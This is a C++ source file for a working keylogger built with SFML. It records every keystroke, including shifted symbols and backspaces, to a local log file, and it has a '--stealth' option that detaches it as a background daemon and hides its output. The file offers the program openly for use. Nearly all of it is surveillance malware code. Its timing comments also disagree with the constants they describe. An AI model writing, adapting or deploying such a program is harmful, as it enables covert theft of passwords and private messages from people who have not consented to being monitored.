/**
 * KeyLogger (Classy Edition)
 * A high-performance, stealthy, and sensitive keylogger built with SFML.
 *
 * Includes:
 * - 5ms polling loop for 200Hz precision.
 * - Auto-Repeat detection.
 * - Graceful file flushing on Ctrl+C.
 * - Stealth background mode.
 */

#include <SFML/Window/Keyboard.hpp>
#include <atomic>
#include <chrono>
#include <csignal>
#include <ctime>
#include <fstream>
#include <iomanip>
#include <iostream>
#include <sstream>
#include <thread>
#include <unistd.h>

// --- Global flag for graceful shutdown ---
std::atomic<bool> g_running{true};

void handleSignal(int signum) {
  if (signum == SIGINT || signum == SIGTERM) {
    g_running = false;
  }
}

// --- Perfect Timing Constants (Based on 5ms loops) ---
const int REPEAT_DELAY =
    10; // 60 * 5ms = 300ms (Standard delay before repeating starts)
const int REPEAT_INTERVAL = 6; // 8 * 5ms = 40ms (Standard fast repeat speed)

class KeyLogger {
private:
  std::ofstream logFile;
  int keyTimers[sf::Keyboard::KeyCount] = {0};
  bool capsLockOn = false;
  bool capsLockPressedLastFrame = false;

  char getChar(sf::Keyboard::Key key, bool shifted, bool capsLock) {
    if (key >= sf::Keyboard::Key::A && key <= sf::Keyboard::Key::Z) {
      int offset =
          static_cast<int>(key) - static_cast<int>(sf::Keyboard::Key::A);
      bool upper = shifted ^ capsLock;
      return upper ? static_cast<char>('A' + offset)
                   : static_cast<char>('a' + offset);
    }
    if (key >= sf::Keyboard::Key::Num0 && key <= sf::Keyboard::Key::Num9) {
      int offset =
          static_cast<int>(key) - static_cast<int>(sf::Keyboard::Key::Num0);
      if (!shifted)
        return static_cast<char>('0' + offset);
      switch (key) {
      case sf::Keyboard::Key::Num1:
        return '!';
      case sf::Keyboard::Key::Num2:
        return '@';
      case sf::Keyboard::Key::Num3:
        return '#';
      case sf::Keyboard::Key::Num4:
        return '$';
      case sf::Keyboard::Key::Num5:
        return '%';
      case sf::Keyboard::Key::Num6:
        return '^';
      case sf::Keyboard::Key::Num7:
        return '&';
      case sf::Keyboard::Key::Num8:
        return '*';
      case sf::Keyboard::Key::Num9:
        return '(';
      case sf::Keyboard::Key::Num0:
        return ')';
      default:
        return ' ';
      }
    }
    switch (key) {
    case sf::Keyboard::Key::Space:
      return ' ';
    case sf::Keyboard::Key::Enter:
      return '\n';
    case sf::Keyboard::Key::Tab:
      return '\t';
    case sf::Keyboard::Key::Grave:
      return shifted ? '~' : '`';
    case sf::Keyboard::Key::Hyphen:
      return shifted ? '_' : '-';
    case sf::Keyboard::Key::Equal:
      return shifted ? '+' : '=';
    case sf::Keyboard::Key::LBracket:
      return shifted ? '{' : '[';
    case sf::Keyboard::Key::RBracket:
      return shifted ? '}' : ']';
    case sf::Keyboard::Key::Backslash:
      return shifted ? '|' : '\\';
    case sf::Keyboard::Key::Semicolon:
      return shifted ? ':' : ';';
    case sf::Keyboard::Key::Apostrophe:
      return shifted ? '"' : '\'';
    case sf::Keyboard::Key::Comma:
      return shifted ? '<' : ',';
    case sf::Keyboard::Key::Period:
      return shifted ? '>' : '.';
    case sf::Keyboard::Key::Slash:
      return shifted ? '?' : '/';
    default:
      return 0;
    }
  }

  std::string currentDateTime() {
    auto now =
        std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
    std::stringstream ss;
    ss << std::put_time(std::localtime(&now), "%Y-%m-%d %H:%M:%S");
    return ss.str();
  }

public:
  KeyLogger(const std::string &outputFile) {
    logFile.open(outputFile, std::ios::app);
    if (logFile.is_open()) {
      logFile << "\n\n[SESSION: " << currentDateTime() << "]\n";
      logFile << "------------------------------------------\n";
      logFile.flush();
    } else {
      std::cerr << "Failed to open output file: " << outputFile << "\n";
      g_running = false;
    }
  }

  ~KeyLogger() {
    if (logFile.is_open()) {
      logFile << "\n------------------------------------------\n";
      logFile << "[SESSION ENDED: " << currentDateTime() << "]\n";
      logFile.close();
    }
  }

  void run() {
    while (g_running) {
      bool isShifted = sf::Keyboard::isKeyPressed(sf::Keyboard::Key::LShift) ||
                       sf::Keyboard::isKeyPressed(sf::Keyboard::Key::RShift);

      // Caps Lock Toggle
      if (sf::Keyboard::isKeyPressed(sf::Keyboard::Scan::CapsLock)) {
        if (!capsLockPressedLastFrame) {
          capsLockOn = !capsLockOn;
          capsLockPressedLastFrame = true;
        }
      } else {
        capsLockPressedLastFrame = false;
      }

      for (int i = 0; i < sf::Keyboard::KeyCount; ++i) {
        sf::Keyboard::Key key = static_cast<sf::Keyboard::Key>(i);

        if (sf::Keyboard::isKeyPressed(key)) {
          bool shouldLog = false;

          if (keyTimers[i] == 0) {
            // 1. Initial Press
            shouldLog = true;
            keyTimers[i] = 1;
          } else {
            // 2. Key is being held
            keyTimers[i]++;

            // 3. Auto-repeat trigger
            if (keyTimers[i] >= REPEAT_DELAY) {
              shouldLog = true;
              // Bounce the timer back to keep repeating
              keyTimers[i] = REPEAT_DELAY - REPEAT_INTERVAL;
            }
          }

          if (shouldLog) {
            char c = getChar(key, isShifted, capsLockOn);
            if (c != 0) {
              logFile << c;
              logFile.flush(); // Ensure data is saved immediately
            } else if (key == sf::Keyboard::Key::Backspace) {
              logFile << "[BS]";
              logFile.flush();
            }
          }
        } else {
          // Key released: Reset to 0 immediately
          keyTimers[i] = 0;
        }
      }

      // High sensitivity 5ms sleep
      std::this_thread::sleep_for(std::chrono::milliseconds(5));
    }
  }
};

void printHelp() {
  std::cout << "KeyLogger Usage:\n";
  std::cout
      << "  --output <file>   Specify the output file (default: dat.txt)\n";
  std::cout << "  --stealth         Run as a background daemon (Linux only)\n";
  std::cout << "  --help            Show this help message\n";
}

int main(int argc, char *argv[]) {
  // Elegant Signal Handling
  std::signal(SIGINT, handleSignal);
  std::signal(SIGTERM, handleSignal);

  std::string outputFile = "dat.txt";
  bool stealthMode = false;

  // Parse primitive command line arguments
  for (int i = 1; i < argc; ++i) {
    std::string arg = argv[i];
    if (arg == "--help") {
      printHelp();
      return 0;
    } else if (arg == "--output" && i + 1 < argc) {
      outputFile = argv[++i];
    } else if (arg == "--stealth") {
      stealthMode = true;
    } else {
      std::cout << "Unknown argument: " << arg << "\n";
      printHelp();
      return 1;
    }
  }

  if (stealthMode) {
    std::cout << "🕵️ Entering Stealth Mode. Process will detach...\n";
    // daemon(0, 0) means: change dir to /, and redirect standard outputs to
    // /dev/null
    if (daemon(0, 0) < 0) {
      std::cerr << "Failed to enter stealth mode!\n";
      return 1;
    }
  } else {
    std::cout << "🕵️ Keylogger Online. Press Ctrl+C to terminate gracefully.\n";
    std::cout << "Output file: " << outputFile << "\n";
  }

  KeyLogger logger(outputFile);
  logger.run();

  if (!stealthMode) {
    std::cout << "\nShutdown signal received. Flushed logs to disk safely. "
                 "Goodbye!\n";
  }

  return 0;
}